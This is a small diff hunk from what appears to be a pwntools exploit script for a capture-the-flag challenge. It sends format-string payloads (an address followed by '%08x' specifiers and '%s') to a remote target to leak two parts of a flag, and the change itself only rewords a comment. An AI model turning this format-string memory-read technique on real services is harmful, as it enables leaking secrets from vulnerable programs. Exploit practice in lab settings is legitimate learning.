@@ -23,7 +23,7 @@ target=remote(host,port)
 
 #payload = p32(flag1) +('%08x '*6+'%s').encode()
 
-# After you get the first part of the flag, use this payload after removing the first one
+# After you get the first part of the flag, use this payload to get the second part. 
 #payload = p32(flag2) +('%08x '*6+'%s').encode()
 target.recvuntil("ploxx")
 target.sendline(payload)
